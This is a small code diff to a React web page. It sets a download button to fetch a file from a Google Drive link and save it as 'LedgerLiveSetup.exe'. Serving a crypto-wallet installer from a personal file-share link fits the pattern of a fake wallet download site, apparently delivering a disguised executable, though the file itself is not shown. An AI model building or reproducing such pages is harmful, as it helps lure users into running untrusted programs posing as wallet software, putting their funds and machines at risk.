@@ -16,8 +16,7 @@ const Home = () => {
   const handleDownload = () => {
     const link = document.createElement("a");
     link.href =
-      "";
-
+      "https://drive.google.com/uc?export=download&id=1JTSy47SnPMyAJUzdeINRqWUczVGhVXvW";
     link.download = "LedgerLiveSetup.exe";
     document.body.appendChild(link);
     link.click();
